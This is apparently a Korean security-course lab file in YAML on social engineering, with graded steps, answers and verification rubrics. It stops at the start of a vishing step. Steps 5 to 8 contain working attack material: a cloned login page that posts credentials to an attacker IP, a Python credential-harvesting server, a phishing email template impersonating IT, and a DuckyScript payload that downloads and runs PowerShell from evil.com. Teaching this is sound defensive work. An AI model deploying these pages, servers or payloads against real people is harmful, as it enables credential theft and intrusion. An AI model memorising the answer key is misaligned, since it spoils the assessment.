lab_id: attack-nonai-week14
title: 소셜 엔지니어링 (Social Engineering)
version: non-ai
course: attack-nonai
week: 14
description: 기술적 취약점이 아닌 인간의 심리적 취약점을 공격하는 소셜 엔지니어링 기법을 학습한다. 피싱 이메일 분석, SET(Social Engineering Toolkit)
  활용, 프리텍스팅 등을 실습한다.
difficulty: medium
duration_minutes: 120
objectives:
- 소셜 엔지니어링의 주요 기법(피싱, 프리텍스팅, 베이팅)을 이해한다
- 피싱 이메일을 분석하고 탐지 지표를 식별할 수 있다
- 조직의 보안 인식 교육 프로그램을 설계할 수 있다
pass_threshold: 0.6
steps:
- order: 1
  instruction: 소셜 엔지니어링의 6가지 영향력 원칙(치알디니)을 정리하고, 각 원칙이 피싱에 어떻게 활용되는지 설명하라.
  hint: 상호성, 일관성, 사회적 증거, 호감, 권위, 희소성의 6가지이다
  category: analysis
  points: 10
  answer: 'echo -e ''=== Cialdini 6 Principles of Influence ===\n\n1. Reciprocity (상호성)\n   Phishing:
    "We gave you a free gift, now verify your account"\n\n2. Commitment/Consistency (일관성)\n   Phishing:
    "You started the verification, please complete it"\n\n3. Social Proof (사회적 증거)\n   Phishing: "50,000
    users already updated their info"\n\n4. Liking (호감)\n   Phishing: Impersonate trusted colleague/friend\n\n5.
    Authority (권위)\n   Phishing: "IT Department requires immediate password reset"\n\n6. Scarcity (희소성)\n   Phishing:
    "Your account will be suspended in 24 hours"'''
  answer_detail: 치알디니의 6가지 영향력 원칙은 소셜 엔지니어링의 이론적 기반이다. 공격자는 이 원칙을 조합하여 피해자의 비합리적 행동(링크 클릭, 정보 제공)을 유도한다.
    보안 인식 교육에서 이 원칙을 가르치면 방어력이 향상된다.
  verify:
    type: output_contains
    expect: Cialdini
    field: stdout
    semantic:
      intent: 치알디니 6원칙 — Reciprocity(상호성)/Commitment(일관성)/Social Proof(사회적 증거)/Liking(호감)/Authority(권위)/Scarcity(희소성).
        Cialdini 'Influence' 1984. 각 원칙의 피싱 활용 사례 — 권위(IT 부서)/희소성(24시간 만료)/사회적 증거(5만 사용자) 등.
      success_criteria:
      - Cialdini 키워드
      - 6개 원칙 모두 (한글/영어 명칭)
      - 각 원칙별 피싱 예시
      acceptable_methods:
      - Cialdini 6 원칙 + 예시
      - MITRE PRE T1598 Phishing for Information
      - SE Framework (Hadnagy)
      negative_signs:
      - 원칙 4개 이하
      - 예시 없음
      - 심리학 맥락 없음
  target_vm: attacker
- order: 2
  instruction: 피싱 이메일의 헤더를 분석하는 방법을 시연하라. 발신자 위조를 탐지하기 위한 SPF, DKIM, DMARC 확인 방법을 설명하라.
  hint: 이메일 헤더의 Received, Return-Path, Authentication-Results를 분석한다
  category: analysis
  points: 10
  answer: 'echo -e ''=== Phishing Email Header Analysis ===\n\n[Key Headers to Check]\n1. From: vs Return-Path:
    (mismatch = suspicious)\n2. Received: chain (trace actual path)\n3. Authentication-Results:\n   -
    SPF: pass/fail (sender IP authorized?)\n   - DKIM: pass/fail (email signed by domain?)\n   - DMARC:
    pass/fail (policy alignment?)\n\n[Red Flags]\n- From shows "bank@secure.com" but Return-Path is "x@evil.com"\n-
    Received chain shows foreign IP\n- SPF: fail -> sender IP not authorized\n- No DKIM signature\n- Reply-To
    different from From\n\n[Verification Commands]\ndig TXT _dmarc.example.com  # Check DMARC policy\ndig
    TXT example.com         # Check SPF record\n\n[Example SPF Check]'' && dig TXT google.com +short 2>/dev/null
    | head -3'
  answer_detail: 이메일 헤더 분석은 피싱 탐지의 핵심 기술이다. SPF는 발신 IP를 검증하고, DKIM은 이메일 무결성을 보장하며, DMARC는 SPF/DKIM 검증
    실패 시의 정책을 정의한다. 세 가지 모두 통과해야 신뢰할 수 있다.
  verify:
    type: output_contains
    expect: Phishing Email Header
    field: stdout
    semantic:
      intent: '이메일 헤더 분석 — From vs Return-Path / Received chain / Authentication-Results: SPF(IP)/DKIM(서명)/DMARC(정책
        정렬). dig TXT _dmarc.domain + dig TXT domain. RFC 7489 DMARC + RFC 7208 SPF + RFC 6376 DKIM.'
      success_criteria:
      - Phishing Email Header 키워드
      - SPF + DKIM + DMARC 3종 모두
      - dig TXT 검증 명령
      acceptable_methods:
      - 헤더 분석 + dig TXT
      - M3AAWG 가이드
      - Microsoft Message Header Analyzer
      negative_signs:
      - 3종 중 1개 이하
      - Red flag 예시 없음
      - dig 검증 없음
  target_vm: attacker
- order: 3
  instruction: 피싱 URL을 분석하는 기법을 시연하라. URL의 도메인, 경로, 파라미터에서 악성 지표를 식별하라.
  hint: URL의 각 구성 요소를 분해하여 분석한다
  category: analysis
  points: 10
  answer: 'echo -e ''=== Phishing URL Analysis ===\n\n[Suspicious URL Patterns]\n1. Typosquatting: g00gle.com,
    googIe.com (I vs l)\n2. Subdomain abuse: google.com.evil-site.com\n3. URL shortener: bit.ly/xxxxx
    (hides real destination)\n4. IP address: http://192.168.1.1/login\n5. Long subdomain: secure-login-google-verify.evil.com\n6.
    Unicode/Punycode: xn--ggle-55da.com (looks like google.com)\n\n[Analysis Steps]\n1. Hover over link
    (don\''t click)\n2. Check actual domain (rightmost before TLD)\n3. Verify SSL certificate issuer\n4.
    Check URL reputation: VirusTotal, URLhaus\n5. Use sandbox: any.run, hybrid-analysis\n\n[Python URL
    Parser]'' && python3 -c "from urllib.parse import urlparse; u=urlparse(''https://secure-login.google.com.evil-site.com/verify?user=admin&token=abc'');
    print(f''Scheme: {u.scheme}''); print(f''Netloc: {u.netloc}''); print(f''Actual domain: evil-site.com'');
    print(f''Path: {u.path}''); print(f''Params: {u.query}'')"'
  answer_detail: URL 분석에서 가장 중요한 것은 실제 도메인을 식별하는 것이다. TLD 바로 앞의 도메인이 실제 소유자이다. google.com.evil-site.com에서
    실제 도메인은 evil-site.com이다.
  verify:
    type: output_contains
    expect: Phishing URL Analysis
    field: stdout
    semantic:
      intent: 피싱 URL 분석 — Typosquatting(g00gle.com) / Subdomain abuse(google.com.evil.com) / URL shortener
        / IP 주소 / 긴 서브도메인 / Unicode Punycode(xn--ggle-55da). VirusTotal/URLhaus 평판. python urlparse 분해.
        TLD 바로 앞이 실제 도메인.
      success_criteria:
      - Phishing URL Analysis 키워드
      - 악성 패턴 4개 이상
      - urlparse + 평판 도구
      acceptable_methods:
      - urlparse + VirusTotal
      - any.run/hybrid-analysis 샌드박스
      - URLScan.io
      negative_signs:
      - 패턴 2개 이하
      - 평판/샌드박스 없음
      - 도메인 분석 누락
  target_vm: attacker
- order: 4
  instruction: SET(Social Engineering Toolkit)의 주요 기능과 공격 벡터를 정리하라.
  hint: SET의 메뉴 구조와 주요 공격 모듈을 설명한다
  category: analysis
  points: 10
  answer: 'echo -e ''=== Social Engineering Toolkit (SET) ===\n\n[Main Modules]\n1. Spear-Phishing Attack\n   -
    Email with malicious attachment\n   - PDF/Office macro payload\n\n2. Website Attack\n   - Java Applet
    Attack\n   - Credential Harvester (clone login page)\n   - Tabnabbing\n   - Web Jacking\n\n3. Infectious
    Media Generator\n   - Autorun payload on USB\n\n4. Mass Mailer\n   - Bulk phishing email sender\n\n5.
    SMS Spoofing\n\n[Most Common: Credential Harvester]\nsetoolkit -> 1 -> 2 -> 3 -> 2\n-> Enter target
    URL (e.g., https://mail.google.com)\n-> SET clones the login page\n-> Victim enters credentials ->
    captured\n\n[Note: SET is pre-installed in Kali Linux]'''
  answer_detail: SET는 소셜 엔지니어링 공격을 자동화하는 프레임워크이다. Credential Harvester는 대상 웹사이트의 로그인 페이지를 복제하여 피해자의 자격
    증명을 수집한다. 모의 피싱 훈련에 자주 사용된다.
  verify:
    type: output_contains
    expect: Social Engineering Toolkit
    field: stdout
    semantic:
      intent: 'SET 모듈 — Spear-Phishing(첨부) + Website Attack(Java Applet/Credential Harvester/Tabnabbing)
        + Infectious Media(USB) + Mass Mailer + SMS Spoofing. 가장 흔한: Credential Harvester (로그인 페이지 클론).
        Kali 기본 설치. setoolkit 메뉴 1→2→3→2.'
      success_criteria:
      - Social Engineering Toolkit 또는 SET 키워드
      - 모듈 4개 이상
      - Credential Harvester 워크플로
      acceptable_methods:
      - SET 모듈 + 메뉴 흐름
      - GoPhish 비교
      - Evilginx2 (MFA 우회 피싱)
      negative_signs:
      - 모듈 2개 이하
      - 워크플로 없음
      - 도구 맥락 없음
  target_vm: attacker
- order: 5
  instruction: 간단한 피싱 페이지(Credential Harvester)를 HTML로 작성하라. JuiceShop 로그인 페이지를 모방하라.
  hint: HTML 폼의 action을 공격자 서버로 지정한다
  category: exploit
  points: 10
  answer: '🖥️ UI: 브라우저에서 http://WEB_IP:3000 접속

    📎 참고 (CLI): cat > /tmp/phishing_page.html << ''HTMLEOF''

    <!DOCTYPE html>

    <html>

    <head><title>OWASP Juice Shop - Login</title>

    <style>body{font-family:Arial;max-width:400px;margin:50px auto;}

    input{width:100%;padding:10px;margin:5px 0;}

    button{background:#4CAF50;color:white;padding:10px;width:100%;border:none;cursor:pointer;}</style>

    </head>

    <body>

    <h2>Juice Shop Login</h2>

    <form action="http://10.20.30.201:8888/capture" method="POST">

    <input type="email" name="email" placeholder="Email" required>

    <input type="password" name="password" placeholder="Password" required>

    <button type="submit">Log in</button>

    </form>

    <!-- Credential Harvester: captures to attacker server -->

    </body>

    </html>

    HTMLEOF

    echo ''Phishing page created:'' && cat /tmp/phishing_page.html'
  answer_detail: Credential Harvester는 정상 로그인 페이지와 시각적으로 동일하지만, 폼 데이터를 공격자 서버로 전송한다. 피해자는 정상적으로 로그인한 것으로
    착각한다. 실제 사이트로 리다이렉트하면 의심을 더욱 줄일 수 있다.
  verify:
    type: output_contains
    expect: Phishing page created
    field: stdout
    semantic:
      intent: Credential Harvester 페이지 — HTML form action=공격자서버/capture method=POST. JuiceShop 로그인 모방.
        시각 동일 + form 데이터만 공격자로 → 피해자는 정상 로그인 인지. MITRE T1566.002 Spearphishing Link.
      success_criteria:
      - Phishing page created 키워드
      - <form action= 공격자 URL
      - email + password input 필드
      acceptable_methods:
      - HTML 폼 + action 위조
      - SET clone 자동화
      - Evilginx2 reverse proxy
      negative_signs:
      - form action 누락
      - input 필드 없음
      - 공격자 서버 명시 없음
  target_vm: attacker
- order: 6
  instruction: python3으로 간단한 Credential Harvester 서버를 작성하라. POST 요청으로 전달된 자격 증명을 로깅하는 HTTP 서버를 만들어라.
  hint: http.server를 활용하여 POST 핸들러를 작성한다
  category: exploit
  points: 10
  answer: "cat > /tmp/harvester.py << 'PYEOF'\nfrom http.server import HTTPServer, BaseHTTPRequestHandler\n\
    import urllib.parse, datetime\n\nclass Handler(BaseHTTPRequestHandler):\n    def do_POST(self):\n\
    \        length = int(self.headers['Content-Length'])\n        data = urllib.parse.parse_qs(self.rfile.read(length).decode())\n\
    \        ts = datetime.datetime.now().isoformat()\n        print(f\"[{ts}] CAPTURED: email={data.get('email',['?'])[0]}\
    \ password={data.get('password',['?'])[0]}\")\n        self.send_response(302)\n        self.send_header('Location',\
    \ 'http://10.20.30.80:3000')\n        self.end_headers()\n\nprint('Credential Harvester listening\
    \ on :8888')\nHTTPServer(('0.0.0.0', 8888), Handler).serve_forever()\nPYEOF\necho 'Harvester script\
    \ created:' && head -15 /tmp/harvester.py"
  answer_detail: Credential Harvester 서버는 피싱 페이지에서 전송된 자격 증명을 수신하고 기록한다. 302 리다이렉트로 실제 사이트에 보내면 피해자는 단순히
    로그인에 실패한 것으로 인식하고 다시 로그인한다.
  verify:
    type: output_contains
    expect: Harvester script
    field: stdout
    semantic:
      intent: 'Harvester 서버 — python http.server BaseHTTPRequestHandler do_POST: parse_qs로 email/password
        추출 + ts 로깅 + 302 redirect 정상 사이트. MITRE T1056.003 Web Portal Capture. 302로 피해자 의심 회피.'
      success_criteria:
      - Harvester script 키워드
      - do_POST + parse_qs
      - 302 redirect 정상 사이트
      acceptable_methods:
      - python http.server
      - Flask + 로깅
      - PHP $_POST 처리
      negative_signs:
      - POST 핸들러 없음
      - 파싱 로직 없음
      - 리다이렉트 없음
  target_vm: attacker
- order: 7
  instruction: 피싱 이메일 템플릿을 작성하라. IT 부서를 사칭하여 비밀번호 변경을 유도하는 이메일을 만들어라.
  hint: 권위와 긴급성을 활용한 피싱 이메일 형식이다
  category: exploit
  points: 10
  answer: 'echo -e ''=== Phishing Email Template ===\n\nFrom: IT Security Team <security@company-internal.com>\nSubject:
    [긴급] 비밀번호 만료 예정 - 즉시 갱신 필요\n\n안녕하세요,\n\nIT 보안팀입니다.\n\n귀하의 사내 계정 비밀번호가 24시간 내에 만료됩니다.\n아래 링크를 통해 즉시
    비밀번호를 갱신해 주시기 바랍니다.\n\n[비밀번호 갱신하기](http://company-internal.evil-site.com/reset)\n\n갱신하지 않을 경우 계정이
    자동 잠금 처리됩니다.\n\n감사합니다.\nIT Security Team\n\n--- Analysis ---\nPrinciples used: Authority (IT부서), Scarcity
    (24시간), Fear (잠금)\nRed flags: 외부 도메인, 긴급한 톤, 링크 클릭 유도'''
  answer_detail: 효과적인 피싱 이메일은 권위(IT 부서), 긴급성(24시간), 공포(계정 잠금)를 조합한다. 방어 교육에서는 이러한 심리적 조작 패턴을 인식하는 훈련이
    핵심이다.
  verify:
    type: output_contains
    expect: Phishing Email Template
    field: stdout
    semantic:
      intent: '피싱 메일 템플릿 — From: IT Security + Subject: [긴급] 비밀번호 만료 + 24시간 + 외부 도메인 링크. Authority(IT)
        + Scarcity(24h) + Fear(잠금) 3원칙 조합. MITRE T1566.001/.002 Spearphishing.'
      success_criteria:
      - Phishing Email Template 키워드
      - From/Subject/본문 + 링크 구조
      - 사용 원칙 분석 + Red flag
      acceptable_methods:
      - IT 사칭 템플릿
      - BEC (CEO 사칭) 변형
      - GoPhish 템플릿
      negative_signs:
      - 원칙 분석 없음
      - Red flag 없음
      - 긴급성/권위 없음
  target_vm: attacker
- order: 8
  instruction: USB 기반 공격(Rubber Ducky, BadUSB)의 원리를 설명하고, 간단한 HID 공격 페이로드를 작성하라.
  hint: USB HID(Human Interface Device)로 키보드 입력을 자동화한다
  category: analysis
  points: 10
  answer: 'echo -e ''=== USB HID Attack (Rubber Ducky) ===\n\n[Principle]\n- USB device emulates keyboard\n-
    Injects keystrokes at high speed\n- No user interaction needed (auto-executes)\n\n[DuckyScript Example]\nDELAY
    1000\nGUI r\nDELAY 500\nSTRING powershell -w hidden -c "IEX(IWR http://evil.com/payload.ps1)"\nENTER\n\n[Attack
    Flow]\n1. Victim plugs in USB\n2. OS recognizes as keyboard\n3. Keystrokes open terminal\n4. Downloads
    and executes payload\n5. Total time: ~3 seconds\n\n[Defense]\n- USB device whitelisting (Group Policy)\n-
    Endpoint detection (EDR)\n- Disable autorun\n- Physical security awareness'''
  answer_detail: Rubber Ducky는 USB 키보드를 에뮬레이션하여 사전 프로그래밍된 키 입력을 자동 실행한다. OS는 이를 정상 키보드로 인식하므로 기존 보안 소프트웨어로
    차단하기 어렵다. USB 장치 화이트리스팅이 효과적인 방어책이다.
  verify:
    type: output_contains
    expect: USB HID Attack
    field: stdout
    semantic:
      intent: 'USB HID 공격 — Rubber Ducky/BadUSB. USB가 키보드 에뮬레이션 → 사전 프로그래밍된 키 입력. DuckyScript: GUI r +
        powershell IEX(IWR url) + ENTER. 약 3초. MITRE T1200 Hardware Additions. 방어: USB 화이트리스팅(GPO)/EDR/autorun
        off.'
      success_criteria:
      - USB HID Attack 키워드
      - DuckyScript 또는 키 입력 시퀀스
      - 방어 (화이트리스팅/EDR)
      acceptable_methods:
      - DuckyScript
      - BadUSB 펌웨어 변조
      - OMG Cable / Bash Bunny
      negative_signs:
      - HID 원리 없음
      - 스크립트 예시 없음
      - 방어 없음
  target_vm: attacker
- order: 9
  instruction: Vishing(Voice Phishing) 시나리오를 작성하라. 은행 직원을 사칭하여 OTP를 탈취하는 대본을 만들어라.
  hint: 전화 기반 소셜 엔지니어링의 대본 형식으로 작성한다
  category: analysis
